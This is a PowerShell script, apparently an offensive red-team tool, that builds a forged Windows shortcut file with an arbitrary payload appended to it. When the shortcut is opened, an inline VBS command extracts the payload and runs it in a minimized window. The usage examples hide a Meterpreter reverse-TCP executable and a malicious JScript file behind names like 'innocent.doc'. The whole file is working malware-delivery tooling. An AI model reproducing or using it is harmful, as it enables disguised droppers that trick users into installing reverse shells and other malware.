function Invoke-HideFileInLNK
{
	<#
	.SYNOPSIS
	Function: Invoke-HideFileInLNK
	Author: Arno0x0x, Twitter: @Arno0x0x
	
	This script creates a specifically forged link file (.lnk) to embed any type of file in it, as per the technique described here:
	https://www.phrozen.io/page/shortcuts-as-entry-points-for-malware-part-3
	
	The embedded file is first extracted from the link file using an inline VBS script, and the file is then called
	either directly (if it's an executable or a script), or throuh a so called "Final Command".
	
	.EXAMPLE
    # Embed an executable
	PS C:\> Invoke-HideFileInLNK -InputFilePath x86_meterpreter_rev_tcp.exe -LinkName innocent
	
    # Embed an executable and specifiy a link description/comment
    PS C:\> Invoke-HideFileInLNK -InputFilePath x86_meterpreter_rev_tcp.exe -LinkName innocent.doc -Description "random description"
	
    # Embed a JScript file as a text file and specify the command to run it
    PS C:\> Invoke-HideFileInLNK -InputFilePath malicious_js.txt -LinkName innocent.doc -Command "cscript /e:jscript"
	
	#>
	
	[CmdletBinding()]
	Param (

	[Parameter(Mandatory = $True)]
	[ValidateNotNullOrEmpty()]
	[String]$InputFilePath = $( Read-Host "Path to the file to hide: " ),


	[Parameter(Mandatory = $True)]
	[ValidateNotNullOrEmpty()]
	[String]$LinkName = $( Read-Host "Link file name: "),

	[Parameter(Mandatory = $False)]
	[String]$Description,
	
	[Parameter(Mandatory = $False)]
	[String]$Command
	)
	
	#-------------------------------------------------------------------------
	# Fixing input arguments
	#-------------------------------------------------------------------------
	if (-Not ($Description)) { $Description = $LinkName }
	
	# Sanitizing file name
	if (!($LinkName -match "^.*(\.lnk)$")) {
		$LinkFileName = (Split-Path -Leaf -Path $LinkName) + ".lnk"
	}
	
	# Get the input file name only, removing the path part
	$InputFileName = Split-Path -Leaf -Path $InputFilePath
	$Extension = [System.IO.Path]::GetExtension($InputFileName)
	
	# If the command is empty, assume the embedded file is an auto-executable (PE or Script)
	if (-Not ($Command)) { $Command = "d" }
	else { $Command = "`"{0} x{1}`"" -f $Command, $Extension }
	
	#DEBUG
	#Write-Verbose "`nLink file: [$LinkFileName]`nEmbedding: [$InputFilePath]`nLink Description: [$Description]`nFinal command: [$Command]"
	
	#-------------------------------------------------------------------------
	# Create a first version of the link file, to later get its actual size and adapt the target arguments
	#-------------------------------------------------------------------------
	$Position = 9999
	$VBSCode =@"
/c echo t="ADODB.Stream":Set b=CreateObject(t):Set c=CreateObject(t):b.Type=1:b.Open:b.LoadFromFile "${LinkFileName}":b.Position=${Position}:c.Type=1:c.Open:b.CopyTo c:d="x${Extension}":c.SaveToFile d,2:Set o=CreateObject("WScript.Shell"):o.Run(${Command})>x.vbs&x.vbs
"@

	if ($VBSCode.length -gt 260) {
		Write-Host "[WARN] Link target is longer than 260 characters. It might not work on all (future) version of Windows."
	}
	
	CreateLnkFile -FileName $LinkFileName -Description $Description -Arguments $VBSCode

	#-------------------------------------------------------------------------
	# Create the final version of the link file matching the actual link file length
	#-------------------------------------------------------------------------
	# Get the actual size of the created lnk file
	$Position = (Get-Item $LinkFileName).length
	$VBSCode =@"
/c echo t="ADODB.Stream":Set b=CreateObject(t):Set c=CreateObject(t):b.Type=1:b.Open:b.LoadFromFile "${LinkFileName}":b.Position=${Position}:c.Type=1:c.Open:b.CopyTo c:d="x${Extension}":c.SaveToFile d,2:Set o=CreateObject("WScript.Shell"):o.Run(${Command})>x.vbs&x.vbs
"@

	Write-Verbose ("`nLink target code: [%COMSPEC% $VBSCode]`nLink target length: [{0}]" -f $VBSCode.length)
	CreateLnkFile -FileName $LinkFileName -Description $Description -Arguments $VBSCode
	
	#-------------------------------------------------------------------------
	# Eventually, concatenate the link file and the payload file
	#-------------------------------------------------------------------------
	cmd /c copy /b $LinkFileName + /b $InputFilePath $LinkFileName | Out-Null
}

#-------------------------------------------------------------------------
# Function creating a link file
#-------------------------------------------------------------------------
function CreateLnkFile()
{
	Param ([string]$FileName,[string]$Description, [string]$Arguments)

	$Shell = New-Object -ComObject ("WScript.Shell")
	$ShortCut = $Shell.CreateShortcut($FileName)
	$ShortCut.TargetPath = "%COMSPEC%"
	$ShortCut.Arguments = $Arguments
	$ShortCut.WorkingDirectory = "";
	$ShortCut.WindowStyle = 7; # SW_SHOWMINIMIZED
	$ShortCut.IconLocation = "shell32.dll, 1";
	$ShortCut.Description = $Description;
	$ShortCut.Save()
}